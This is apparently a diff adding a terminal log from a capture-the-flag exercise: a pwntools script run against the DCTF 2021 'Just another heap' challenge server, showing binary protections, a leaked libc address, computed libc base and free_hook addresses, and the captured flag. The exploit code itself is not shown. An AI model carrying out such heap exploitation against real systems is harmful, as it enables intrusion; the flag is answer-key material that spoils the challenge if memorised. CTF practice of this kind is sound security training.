@@ -1,0 +1,19 @@
+mito@ubuntu:~/CTF/DCTF_2021/Pwn_Just_another_heap_400$ python solve.py r
+[*] '/home/mito/CTF/DCTF_2021/Pwn_Just_another_heap_400/just_another_heap'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+[+] Opening connection to dctf-chall-just-another-heap.westeurope.azurecontainer.io on port 7481: Done
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+libc_leak = 0x7f8eca9e8ca0
+libc_base = 0x7f8eca5fd000
+free_hook = 0x7f8eca9ea8e8
+[*] Switching to interactive mode
+Which memory would you like to forget?
+> dctf{I_h4V3_0_id3a_h0W_y0u_G0T_h3r3}
